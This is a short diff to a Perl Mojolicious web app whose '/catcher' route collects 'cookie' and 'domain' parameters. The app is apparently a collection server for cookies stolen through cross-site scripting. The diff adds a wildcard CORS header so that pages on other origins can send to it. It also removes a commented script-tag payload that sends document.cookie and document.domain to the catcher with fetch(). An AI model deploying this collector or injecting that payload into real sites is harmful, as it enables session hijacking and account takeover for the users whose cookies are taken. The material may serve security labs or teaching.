@@ -8,6 +8,8 @@ use warnings;
 use Mojolicious::Lite -signatures;
 
 get "/catcher" => sub ($catcher) {
+	$catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");
+
 	my $cookie = $catcher -> param("cookie");
 	my $domain = $catcher -> param("domain");
 	
@@ -23,5 +25,3 @@ get "/catcher" => sub ($catcher) {
 };
 
 app -> start();
-
-# <script>fetch("http://localhost:8080/catcher?domain=" + document.domain + "&cookie=" + document.cookie );</script>
